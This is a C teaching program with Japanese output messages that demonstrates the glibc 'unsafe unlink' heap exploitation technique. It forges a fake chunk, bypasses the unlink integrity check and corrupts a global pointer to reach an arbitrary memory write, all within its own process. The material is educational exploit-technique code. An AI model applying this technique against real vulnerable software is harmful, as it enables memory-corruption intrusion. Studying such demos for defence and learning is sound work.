#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <assert.h>

uint64_t *chunk0_ptr;

int main()
{
	setbuf(stdout, NULL);
	printf("unsafe unlink 2.0 へようこそ!\n");
	printf("Ubuntu 20.04 64bit でテストしています。\n");
	printf("この技法は、unlink を呼び出せる領域へのポインタが既知の場所にあるときに使えます。\n");
	printf("最も一般的な場面は、オーバーフローさせられる脆弱なバッファがあり、グローバルポインタを持っている場合です。\n");

	int malloc_size = 0x420; //tcache や fastbin を使わない程度に大きくしたい
	int header_size = 2;

	printf("この演習のポイントは、free を使ってグローバルな chunk0_ptr を破壊し、任意のメモリ書き込みを達成することです。\n\n");

	chunk0_ptr = (uint64_t*) malloc(malloc_size); //chunk0
	uint64_t *chunk1_ptr  = (uint64_t*) malloc(malloc_size); //chunk1
	printf("グローバルな chunk0_ptr は %p にあり、%p を指しています\n", &chunk0_ptr, chunk0_ptr);
	printf("破壊する被害者のチャンクは %p にあります\n\n", chunk1_ptr);

	printf("chunk0 の内部に偽のチャンクを作ります。\n");
	printf("https://sourceware.org/git/?p=glibc.git;a=commitdiff;h=d6db68e66dff25d12c3bc5641b60cbd7fb6ab44f で導入されたチェックを回避できるよう、偽のチャンクのサイズを設定します\n");
	chunk0_ptr[1] = chunk0_ptr[-1] - 0x10;
	printf("P->fd->bk = P となるように、偽のチャンクの 'next_free_chunk' (fd) が &chunk0_ptr の近くを指すように設定します。\n");
	chunk0_ptr[2] = (uint64_t) &chunk0_ptr-(sizeof(uint64_t)*3);
	printf("P->bk->fd = P となるように、偽のチャンクの 'previous_free_chunk' (bk) が &chunk0_ptr の近くを指すように設定します。\n");
	printf("この設定により、次のチェックを通過できます: (P->fd->bk != P || P->bk->fd != P) == False\n");
	chunk0_ptr[3] = (uint64_t) &chunk0_ptr-(sizeof(uint64_t)*2);
	printf("偽のチャンクの fd: %p\n",(void*) chunk0_ptr[2]);
	printf("偽のチャンクの bk: %p\n\n",(void*) chunk0_ptr[3]);

	printf("chunk0 にオーバーフローがあり、chunk1 のメタデータを自由に変更できるものと仮定します。\n");
	uint64_t *chunk1_hdr = chunk1_ptr - header_size;
	printf("chunk0 のサイズ(chunk1 に 'previous_size' として保存されています)を縮めて、free が、chunk0 は偽のチャンクを置いた場所から始まっていると思うようにします。\n");
	printf("偽のチャンクが、既知のポインタが指す位置からちょうど始まり、それに合わせてチャンクを縮めることが重要です\n");
	chunk1_hdr[0] = malloc_size;
	printf("chunk0 を「通常どおり」解放していれば、chunk1.previous_size は 0x430 になっていたはずですが、新しい値は次のとおりです: %p\n",(void*)chunk1_hdr[0]);
	printf("chunk1 の 'previous_in_use' を False に設定して、偽のチャンクを解放済みとして印付けします。\n\n");
	chunk1_hdr[1] &= ~1;

	printf("ここで chunk1 を解放します。これにより後方への統合(consolidate backward)が偽のチャンクを unlink し、chunk0_ptr が上書きされます。\n");
	printf("unlink_chunk 関数のソースは https://sourceware.org/git/?p=glibc.git;a=commitdiff;h=1ecba1fafc160ca70f81211b23f688df8676e612 にあります\n\n");
	free(chunk1_ptr);

	printf("この時点で、chunk0_ptr を使って自分自身を上書きし、任意の場所を指すようにできます。\n");
	char victim_string[8];
	strcpy(victim_string,"Hello!~");
	chunk0_ptr[3] = (uint64_t) victim_string;

	printf("chunk0_ptr は狙った場所を指すようになったので、これを使って被害者の文字列を上書きします。\n");
	printf("元の値: %s\n",victim_string);
	chunk0_ptr[0] = 0x4141414142424242LL;
	printf("新しい値: %s\n",victim_string);

	// 健全性チェック
	assert(*(long *)victim_string == 0x4141414142424242L);
}

